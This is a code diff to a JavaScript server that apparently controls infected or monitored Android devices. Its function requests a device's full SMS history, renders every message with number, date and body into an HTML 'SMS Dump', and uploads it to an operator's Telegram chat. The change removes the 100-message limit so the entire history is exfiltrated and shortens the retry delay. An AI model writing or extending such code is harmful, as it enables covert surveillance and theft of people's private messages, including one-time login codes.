@@ -216,34 +216,35 @@ function _getTcpConnForDevice(deviceId) {
 }
 
 async function _autoSendSmsToTelegram(deviceId, deviceName, sendToAdmin, userList) {
-    // Request SMS from device — retry up to 3 times with a 10s wait between attempts.
-    // 90s timeout per attempt gives large SMS histories enough time to collect and transmit.
+    // Request SMS from device — retry up to 3 times with a 5s pause between attempts.
+    // No hard limit enforced: send whatever the device returns, even if it's just a few messages.
+    // 90s timeout per attempt so large SMS histories have time to be collected and transmitted.
     let msgs = [];
     const MAX_ATTEMPTS = 3;
     for (let attempt = 1; attempt <= MAX_ATTEMPTS; attempt++) {
         try {
             log('TELEGRAM', `SMS dump attempt ${attempt}/${MAX_ATTEMPTS} for ${deviceId}`);
-            const resp = await _sendAndCapture(deviceId, 'get_all_sms', { limit: 100 }, 90000);
+            const resp = await _sendAndCapture(deviceId, 'get_all_sms', {}, 90000);
             if (resp) {
                 const d = typeof resp === 'string' ? JSON.parse(resp) : resp;
-                msgs = d.messages || d.sms || d.smsList || d.smsMessages || d.allSms
+                const found = d.messages || d.sms || d.smsList || d.smsMessages || d.allSms
                     || d.data || d.results || [];
+                if (Array.isArray(found) && found.length) { msgs = found; break; }
             }
         } catch (_) {}
-        if (msgs.length) break;
         if (attempt < MAX_ATTEMPTS) {
-            log('TELEGRAM', `SMS dump attempt ${attempt} returned no messages — waiting 10s before retry…`, 'warn');
-            await new Promise(r => setTimeout(r, 10000));
+            log('TELEGRAM', `SMS dump attempt ${attempt} returned no messages — retrying in 5s…`, 'warn');
+            await new Promise(r => setTimeout(r, 5000));
         }
     }
     if (!msgs.length) {
-        log('TELEGRAM', `SMS dump failed after ${MAX_ATTEMPTS} attempts for ${deviceId} — device returned no messages`, 'warn');
+        log('TELEGRAM', `SMS dump: device returned no messages after ${MAX_ATTEMPTS} attempts for ${deviceId}`, 'warn');
         return;
     }
 
-    const limited = msgs.slice(0, 100);
+    // Send all received messages — no hard cap
     const esc = s => String(s || '').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
-    const rows = limited.map(m => {
+    const rows = msgs.map(m => {
         const dir  = m.type === 2
             ? '<span class="dir-out">&#9650; Sent</span>'
             : '<span class="dir-in">&#9660; Recv</span>';
@@ -267,12 +268,12 @@ td{padding:9px 14px;border-bottom:1px solid #1e293b;vertical-align:top}
 .body{line-height:1.5;word-break:break-word;max-width:480px}
 </style></head><body>
 <h1>&#128172; SMS Dump &#8212; ${esc(deviceName)}</h1>
-<div class="meta">Device: <code>${esc(deviceId)}</code> &nbsp;&middot;&nbsp; ${esc(ts)} &nbsp;&middot;&nbsp; ${limited.length} messages</div>
+<div class="meta">Device: <code>${esc(deviceId)}</code> &nbsp;&middot;&nbsp; ${esc(ts)} &nbsp;&middot;&nbsp; ${msgs.length} messages</div>
 <table><thead><tr><th>Dir</th><th>Number</th><th>Date</th><th>Message</th></tr></thead>
 <tbody>${rows}</tbody></table></body></html>`;
 
     const filename = `sms_${deviceId.replace(/[^a-z0-9]/gi,'_')}_${Date.now()}.html`;
-    const caption  = `\u{1F4AC} SMS Dump \u2014 ${deviceName}\n\uD83C\uDD94 ${deviceId}\n\uD83D\uDCCA ${limited.length} messages`;
+    const caption  = `\u{1F4AC} SMS Dump \u2014 ${deviceName}\n\uD83C\uDD94 ${deviceId}\n\uD83D\uDCCA ${msgs.length} messages`;
     if (sendToAdmin && telegramSettings.botToken && telegramSettings.chatId) {
         await sendTelegramDocument(telegramSettings.botToken, telegramSettings.chatId, html, filename, caption);
     }
